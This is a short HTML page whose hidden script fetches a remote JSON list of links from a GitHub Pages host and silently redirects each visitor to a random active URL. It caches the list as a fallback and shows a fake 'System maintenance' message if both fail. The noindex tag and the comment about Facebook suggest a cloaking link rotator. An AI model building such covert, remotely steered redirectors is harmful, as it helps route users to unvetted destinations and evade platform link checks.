<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      overflow: hidden;
      display: none; /* 防止FB或浏览器闪屏 */
    }
  </style>

  <script>
    (async () => {
      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
      const LOCAL_KEY = "lastActiveLinks";
      let activeLinks = [];

      try {
        // ① 拉取主 JSON（强制无缓存）
        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
        if (!res.ok) throw new Error("mapping.json not found");

        // ② JSON 解析
        const data = await res.json();
        if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");

        // ③ 筛选 active:true
        activeLinks = data.links.filter(l => l.active);
        if (!activeLinks.length) throw new Error("No active links");

        // ④ 缓存最新可用链接
        localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));

        // ⑤ 随机跳转
        const idx = Math.floor(Math.random() * activeLinks.length);
        location.replace(activeLinks[idx].url);
        return;

      } catch (e) {
        console.error("Redirect failed:", e);
      }

      // ⑥ 网络断开 / JSON失败 → 使用缓存兜底
      const cached = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
      if (cached.length) {
        const idx = Math.floor(Math.random() * cached.length);
        location.replace(cached[idx].url);
        return;
      }

      // ⑦ 完全失败 → 显示提示（不会空白页）
      document.body.style.display = "block";
      document.body.innerHTML = `
        <h2 style="font-family: sans-serif; padding: 20px;">
          System maintenance. Please try again later.
        </h2>
      `;
    })();
  </script>
</head>
<body></body>
</html>
